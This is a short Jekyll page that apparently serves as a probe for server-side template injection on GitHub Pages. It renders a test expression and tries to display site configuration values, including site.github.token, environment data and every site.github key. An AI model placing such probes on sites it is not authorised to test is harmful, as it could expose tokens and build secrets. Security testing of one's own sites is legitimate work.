---
layout: default
title: SSTI Probe
---

# GitHub Pages SSTI Test

## A. Math expression ({{ '{{' }} 7 * 7 {{ '}}' }})
Result: {{ 7 * 7 }}

## B. Site config exposure
- site.url: {{ site.url }}
- site.github.api_url: {{ site.github.api_url }}
- site.github.token: {{ site.github.token }}
- site.github.environment: {{ site.github.environment }}
- jekyll.version: {{ jekyll.version }}
- jekyll.environment: {{ jekyll.environment }}

## C. ENV variables
- ENV[HOME]: {{ site.data.env }}

## D. Page variables
- page.path: {{ page.path }}
- page.url: {{ page.url }}

## E. All site.github keys
{% for pair in site.github %}
- {{ pair[0] }}: {{ pair[1] | truncate: 60 }}
{% endfor %}
